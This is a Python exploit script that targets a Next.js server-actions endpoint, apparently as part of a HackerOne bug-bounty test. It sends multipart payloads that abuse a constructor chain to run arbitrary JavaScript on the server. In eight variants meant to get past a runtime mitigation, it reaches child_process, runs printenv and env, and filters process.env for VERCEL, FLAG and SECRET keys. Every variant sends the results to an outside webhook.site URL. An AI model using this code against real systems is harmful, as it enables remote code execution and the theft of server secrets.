#!/usr/bin/env python3
"""
Try different bypass techniques for runtime mitigation
"""

import requests
import json
import random
import string
import time

TARGET = "https://nextjs-cve-hackerone.vercel.app"
ACTION_ID = "007138e0bfbdd7fe024391a1251fd5861f0b5145dc"
WEBHOOK = "https://webhook.site/f794cbb8-6c39-49cc-987a-a141d67c244a"

def try_exploit(code, label):
    """Execute arbitrary JavaScript code"""
    print(f"\n[*] Attempting: {label}")

    boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))

    payload_0 = f"$F1#{ACTION_ID}#constructor"
    payload_1 = {
        "constructor": {
            "constructor": code
        }
    }

    body = f'------{boundary}\r\n'
    body += 'Content-Disposition: form-data; name="0"\r\n\r\n'
    body += payload_0 + '\r\n'
    body += f'------{boundary}\r\n'
    body += 'Content-Disposition: form-data; name="1"\r\n\r\n'
    body += json.dumps(payload_1) + '\r\n'
    body += f'------{boundary}--\r\n'

    headers = {
        'Next-Action': ACTION_ID,
        'Content-Type': f'multipart/form-data; boundary=----{boundary}',
        'Accept': 'text/x-component',
    }

    try:
        response = requests.post(TARGET, data=body, headers=headers, timeout=15)
        print(f"    Status: {response.status_code}")
        if response.status_code == 500:
            print(f"    ✓ Triggered! Check webhook")
        return response
    except Exception as e:
        print(f"    Error: {e}")
        return None

print("="*70)
print("Runtime Mitigation Bypass Attempts")
print("="*70)

# Attempt 1: Use process.mainModule.require
code1 = f"""
const cp = process.mainModule.require('child_process');
const out = cp.execSync('printenv VERCEL_PLATFORM_PROTECTION', {{encoding:'utf8'}});
require('https').get('{WEBHOOK}?attempt1=' + encodeURIComponent(out));
"""
try_exploit(code1, "process.mainModule.require")
time.sleep(2)

# Attempt 2: Use global.process
code2 = f"""
const cp = global.process.mainModule.require('child_process');
const out = cp.execSync('env | grep VERCEL', {{encoding:'utf8'}});
require('https').get('{WEBHOOK}?attempt2=' + encodeURIComponent(out));
"""
try_exploit(code2, "global.process.mainModule.require")
time.sleep(2)

# Attempt 3: Access child_process through module cache
code3 = f"""
const mod = process.binding('module_wrap');
const cp = require('child_process');
const out = cp.execSync('printenv VERCEL_PLATFORM_PROTECTION', {{encoding:'utf8'}});
require('https').get('{WEBHOOK}?attempt3=' + encodeURIComponent(out));
"""
try_exploit(code3, "process.binding")
time.sleep(2)

# Attempt 4: Use require.cache
code4 = f"""
const cp = require.cache[require.resolve('child_process')].exports;
const out = cp.execSync('printenv VERCEL_PLATFORM_PROTECTION', {{encoding:'utf8'}});
require('https').get('{WEBHOOK}?attempt4=' + encodeURIComponent(out));
"""
try_exploit(code4, "require.cache")
time.sleep(2)

# Attempt 5: Direct process.env access (no child_process needed!)
code5 = f"""
const envVar = process.env.VERCEL_PLATFORM_PROTECTION || 'not_found';
require('https').get('{WEBHOOK}?attempt5_direct_env=' + encodeURIComponent(envVar));
"""
try_exploit(code5, "Direct process.env access")
time.sleep(2)

# Attempt 6: Dump all env vars containing VERCEL
code6 = f"""
const envs = Object.keys(process.env).filter(k => k.includes('VERCEL')).map(k => k+'='+process.env[k]).join('|');
require('https').get('{WEBHOOK}?attempt6_all_vercel=' + encodeURIComponent(envs));
"""
try_exploit(code6, "All VERCEL env vars")
time.sleep(2)

# Attempt 7: Use import() instead of require
code7 = f"""
import('child_process').then(cp => {{
    const out = cp.execSync('printenv VERCEL_PLATFORM_PROTECTION', {{encoding:'utf8'}});
    require('https').get('{WEBHOOK}?attempt7=' + encodeURIComponent(out));
}});
"""
try_exploit(code7, "import() instead of require")
time.sleep(2)

# Attempt 8: Just send process.env as JSON
code8 = f"""
const filtered = {{}};
for(let k in process.env) {{
    if(k.includes('VERCEL') || k.includes('FLAG') || k.includes('SECRET')) {{
        filtered[k] = process.env[k];
    }}
}}
require('https').get('{WEBHOOK}?attempt8=' + encodeURIComponent(JSON.stringify(filtered)));
"""
try_exploit(code8, "Filtered process.env JSON")

print(f"\n[*] All attempts sent! Check webhook: {WEBHOOK}")
print("="*70)
